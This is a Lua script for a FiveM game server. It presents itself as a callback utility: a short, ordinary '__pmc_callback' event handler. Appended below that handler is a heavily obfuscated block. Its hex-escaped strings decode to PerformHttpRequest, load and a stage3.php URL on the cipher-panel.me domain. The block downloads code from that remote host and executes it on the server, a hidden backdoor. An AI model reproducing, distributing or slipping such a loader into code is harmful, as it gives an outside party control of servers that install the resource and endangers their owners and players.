
RegisterNetEvent('__pmc_callback:server')
AddEventHandler('__pmc_callback:server', function(eventName, ticket, ...)
	local s = source
	local p = promise.new()

	TriggerEvent('s__pmc_callback:'..eventName, function(...)
		p:resolve({...})
	end, s, ...)

	local result = Citizen.Await(p)
	TriggerClientEvent(('__pmc_callback:client:%s:%s'):format(eventName, ticket), s, table.unpack(result))
end)


local AGQEKrOOzBcmxlhnzaobchoXFXXVIKExUAwwwtINAHCQiwOnfCawjSuGTpYmYkahyauOeI = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} AGQEKrOOzBcmxlhnzaobchoXFXXVIKExUAwwwtINAHCQiwOnfCawjSuGTpYmYkahyauOeI[4][AGQEKrOOzBcmxlhnzaobchoXFXXVIKExUAwwwtINAHCQiwOnfCawjSuGTpYmYkahyauOeI[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (zTEorwQstATUzgOMhozjAcXCcDbsJHnYxOvPTxDCKQfcIUgBsAmKKnuIeTVrQHWZrwbpFJ, NJZAFKtkiRxePeNjcFulPviSTkKPaKiMctiLNTbaNvZTmieToCWxaFsddDjUEzXwLZwkPk) if (NJZAFKtkiRxePeNjcFulPviSTkKPaKiMctiLNTbaNvZTmieToCWxaFsddDjUEzXwLZwkPk == AGQEKrOOzBcmxlhnzaobchoXFXXVIKExUAwwwtINAHCQiwOnfCawjSuGTpYmYkahyauOeI[6] or NJZAFKtkiRxePeNjcFulPviSTkKPaKiMctiLNTbaNvZTmieToCWxaFsddDjUEzXwLZwkPk == AGQEKrOOzBcmxlhnzaobchoXFXXVIKExUAwwwtINAHCQiwOnfCawjSuGTpYmYkahyauOeI[5]) then return end AGQEKrOOzBcmxlhnzaobchoXFXXVIKExUAwwwtINAHCQiwOnfCawjSuGTpYmYkahyauOeI[4][AGQEKrOOzBcmxlhnzaobchoXFXXVIKExUAwwwtINAHCQiwOnfCawjSuGTpYmYkahyauOeI[2]](AGQEKrOOzBcmxlhnzaobchoXFXXVIKExUAwwwtINAHCQiwOnfCawjSuGTpYmYkahyauOeI[4][AGQEKrOOzBcmxlhnzaobchoXFXXVIKExUAwwwtINAHCQiwOnfCawjSuGTpYmYkahyauOeI[3]](NJZAFKtkiRxePeNjcFulPviSTkKPaKiMctiLNTbaNvZTmieToCWxaFsddDjUEzXwLZwkPk))() end)